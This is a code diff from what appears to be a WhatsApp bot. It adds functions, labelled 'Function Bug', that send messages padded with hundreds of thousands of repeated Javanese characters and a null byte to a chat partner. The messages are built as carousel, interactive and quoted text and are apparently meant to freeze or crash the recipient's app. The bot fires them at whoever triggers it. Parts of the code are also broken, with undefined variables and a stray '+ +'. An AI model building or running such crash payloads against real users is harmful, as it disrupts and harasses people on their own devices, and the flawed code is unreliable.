@@ -100,15 +100,113 @@ console.log();
 }
 
 // Function Bug
-async function ZetshBUG(jid, channelId, channelName = "Zeth D Sylvaa ϟ" + "ꦾ".repeat(500000)) {
-    await zyn.sendMessage(jid, {
-        forwardedNewsletterMessageInfo: {
-            newsletterJid: channelId,
-            newsletterName: channelName,
-            serverMessageId: 1
+async function ZetshBUG(jid, channelName = "Zeth D Sylvaa ϟ" + "ꦾ".repeat(500000)) {
+  const header = proto.Message.InteractiveMessage.Header.create({
+        ...(await prepareWAMessageMedia(
+          { image: { url: "https://files.catbox.moe/uk38k6.jpg" } },
+          { upload: zyn.waUploadToServer }
+        )),
+        title: "Zeth D Sylvaa ϟ" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(100000),
+        subtitle: "𝐊𝐢𝐥𝐥⃟⃟",
+        hasMediaAttachment: true,
+      });
+
+      const body = {
+        text: "\u0000" + "ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ".repeat(300000),
+      };
+
+      // Example carousel content
+      const carouselMessage = {
+        sections: [
+          {
+            title: " El Travas ϟ ",
+            rows: [
+              {
+                title: " ϟ 𝐊𝐢𝐥𝐥 ϟ",
+                description: "ꦾ".repeat(55555),
+                rowId: "ꦾ".repeat(55555),
+              },
+              {
+                title: " ϟ ",
+                description: "ꦾ".repeat(55555),
+                rowId: "ꦾ".repeat(55555),
+              },
+            ],
+          },
+          {
+            title: " ϟ ",
+            rows: [
+              {
+                title: " ϟ GET UR SHIT ϟ",
+                description: "ꦾ".repeat(55555),
+                rowId: "ꦾ".repeat(55555),
+              },
+              {
+                title: " ϟ ",
+                description: "ꦾ".repeat(55555),
+                rowId: "ꦾ".repeat(55555),
+              },
+            ],
+          },
+        ],
+      };
+
+      await zyn.relayMessage(
+        target,
+        {
+          ephemeralMessage: {
+            message: {
+              interactiveMessage: {
+                header: header,
+                body: body,
+                carouselMessage: carouselMessage,
+              },
+            },
+          },
+        },
+        Ptcp
+          ? {
+              participant: {
+                jid: target,
+                quoted: NullNihBos
+              },
+            }
+          : {}
+      );
+    }
+    async function ZetshBUGG(target) {
+       zyn.relayMessage(
+        target,
+        {
+          extendedTextMessage: {
+            text: ` 𝐊𝐢𝐥𝐥⃟⃟ -` + "ꦾ".repeat(100555),
+            contextInfo: {
+              fromMe: false,
+              stanzaId: target,
+              participant: target,
+              quotedMessage: {
+                conversation: "𝐊𝐢𝐥𝐥⃟" + + "ꦾ".repeat(100555),
+              },
+              disappearingMode: {
+                initiator: "CHANGED_IN_CHAT",
+                trigger: "CHAT_SETTING",
+              },
+            },
+            inviteLinkGroupTypeV2: "DEFAULT",
+          },
+        },
+        {
+          participant: {
+            jid: target,
+            quoted: NullNihBos
+          },
+        },
+        {
+          messageId: null,
         }
-    })
-}
+      );
+    }
+
 let bodyText = m.text || m.message?.conversation || ''
 
 if (
@@ -120,17 +218,8 @@ if (
     let user = m.sender // nomor orang yg kirim
 
     await ZetshBUG(m.sender)
-        await ZetshBUG(m.sender)
-            await ZetshBUG(m.sender)
-                await ZetshBUG(m.sender)
-                    await ZetshBUG(m.sender)
-                        await ZetshBUG(m.sender)
-                            await ZetshBUG(m.sender)
-                                await ZetshBUG(m.sender)
-                                    await ZetshBUG(m.sender)
-                                        await ZetshBUG(m.sender)
-                                            await ZetshBUG(m.sender)
-                                                await ZetshBUG(m.sender)
+        await ZetshBUGG(m.sender)
+          
 }
     const NullNihBos = {
       key: {
